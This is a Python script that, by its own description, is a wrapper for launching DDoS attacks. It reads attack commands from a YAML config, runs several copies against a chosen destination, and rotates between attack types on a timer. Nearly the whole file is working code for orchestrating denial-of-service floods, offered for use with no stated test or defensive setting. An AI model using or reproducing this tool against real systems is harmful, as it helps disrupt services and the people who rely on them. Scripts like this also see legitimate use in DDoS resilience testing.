import argparse
from subprocess import call,Popen, PIPE, STDOUT
import yaml
import time, threading
from itertools import cycle

CONF_PATH = 'soda.yml'

def read_conf(path):
  with open(path) as f:
    return yaml.safe_load(f)

def build_command(attack):
  command = [attack['command']]
  flags = []
  if 'flags' in attack and type(attack['flags']) == list:
    for flag in attack['flags']:
      flag = flag.split()
      flags += flag
    command += flags
  command.append(args.destination)
  return command

def launch_attacks(attacks):
  procs = []
  for attack in attacks:
    command = build_command(attack)
    proc = Popen(command)
    procs.append(proc)
  return procs

def launch_attack(attack, threads):
  procs = []
  command = build_command(attack)
  for i in range(threads):
    proc = Popen(command)
    procs.append(proc)
    time.sleep(0.5)
  return procs

def rotate_attacks(attacks):
  attacks_cycle = cycle(attacks)
  for attack in attacks_cycle:
    procs = launch_attack(attack, args.threads)
    call(['ps','-ef'])
    time.sleep(args.interval)
    for proc in procs: 
      Popen.kill(proc)

if __name__ == "__main__":

  parser = argparse.ArgumentParser(description='Wrapper to launch DDoS attacks')
  parser.add_argument('-t','--type', help='Pattern of launching attacks', type=str, default='rotate')
  parser.add_argument('-i','--interval', help='Attack rotation interval', type=int, default=60)
  parser.add_argument('-n','--threads', help='Number of threads', type=int, default=1)
  parser.add_argument('destination', help='Attack destination', type=str)

  args, unknown = parser.parse_known_args()

  conf = read_conf(CONF_PATH)
  if args.type == 'rotate':
    rotate_attacks(conf['attacks'])
